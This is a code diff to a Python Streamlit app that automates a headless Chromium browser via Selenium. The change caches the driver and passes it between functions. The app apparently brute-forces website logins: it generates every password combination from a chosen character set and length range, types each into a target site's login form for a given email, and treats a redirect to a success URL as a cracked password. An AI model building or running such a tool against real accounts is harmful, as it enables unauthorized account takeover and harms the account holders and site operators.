@@ -2,85 +2,62 @@ import streamlit as st
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.common.by import By
+from webdriver_manager.chrome import ChromeDriverManager
+from webdriver_manager.core.os_manager import ChromeType
 from itertools import product
 import time
-import os
-import subprocess
 
 
-def get_chromedriver_path():
+@st.cache_resource
+def get_driver():
     """
-    Automatically downloads and configures the correct ChromeDriver for the Chromium version.
+    Initialize and cache the Selenium WebDriver for Chrome/Chromium.
     """
-    try:
-        # Get the current Chromium version
-        result = subprocess.run(["chromium", "--version"], stdout=subprocess.PIPE, text=True)
-        chromium_version = result.stdout.strip().split(" ")[1]
+    options = Options()
+    options.add_argument("--disable-gpu")
+    options.add_argument("--headless")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
 
-        # Install matching ChromeDriver version
-        from webdriver_manager.chrome import ChromeDriverManager
-        chromedriver_path = ChromeDriverManager(version=chromium_version).install()
-        return chromedriver_path
-    except Exception as e:
-        st.error(f"Failed to get the correct ChromeDriver version: {e}")
-        return None
+    return webdriver.Chrome(
+        service=Service(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install()),
+        options=options,
+    )
 
 
-def login_to_website(url, email, email_field_name, password_field_name, login_button_xpath, password, success_url):
+def login_to_website(driver, url, email, email_field_name, password_field_name, login_button_xpath, password, success_url):
     """
     Attempts to log in to the website using the provided credentials.
     Returns:
         bool: True if login is successful (based on URL match), False otherwise.
     """
     try:
-        # Get ChromeDriver path dynamically
-        chromedriver_path = get_chromedriver_path()
-        if not chromedriver_path:
-            return False
-
-        # Set Chrome options for headless execution
-        chrome_options = Options()
-        chrome_options.add_argument("--headless")
-        chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--no-sandbox")
-
-        # Initialize WebDriver
-        service = Service(chromedriver_path)
-        browser = webdriver.Chrome(service=service, options=chrome_options)
-
-        # Open the website
-        browser.get(url)
-        time.sleep(4)
+        driver.get(url)
+        time.sleep(2)
 
         # Enter email and password
-        browser.find_element(By.NAME, email_field_name).send_keys(email)
-        browser.find_element(By.NAME, password_field_name).send_keys(password)
+        driver.find_element(By.NAME, email_field_name).send_keys(email)
+        driver.find_element(By.NAME, password_field_name).send_keys(password)
 
         # Click the login button
-        WebDriverWait(browser, 5).until(
+        WebDriverWait(driver, 5).until(
             EC.element_to_be_clickable((By.XPATH, login_button_xpath))
         ).click()
 
-        time.sleep(5)  # Wait for the page to load
+        time.sleep(2)  # Wait for the page to load
 
-        # Check if the login is successful
-        if browser.current_url == success_url:
-            return True
+        # Check if login is successful
+        return driver.current_url == success_url
 
     except Exception as e:
         st.error(f"An error occurred during login: {e}")
-
-    finally:
-        if 'browser' in locals():
-            browser.quit()
-
-    return False
+        return False
 
 
-def password_testing(url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url):
+def password_testing(driver, url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url):
     """
     Test password combinations for a given email on a website.
     """
@@ -100,7 +77,7 @@ def password_testing(url, email, email_field_name, password_field_name, login_bu
 
             # Attempt login
             success = login_to_website(
-                url, email, email_field_name, password_field_name, login_button_xpath, attempt_password, success_url
+                driver, url, email, email_field_name, password_field_name, login_button_xpath, attempt_password, success_url
             )
             progress = attempt_count / total_attempts
             progress_bar.progress(progress)
@@ -138,6 +115,7 @@ if st.button("Start Testing"):
     elif min_length > max_length:
         st.error("Minimum length cannot be greater than maximum length.")
     else:
+        driver = get_driver()  # Reuse cached driver instance
         password_testing(
-            url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url
+            driver, url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url
         )
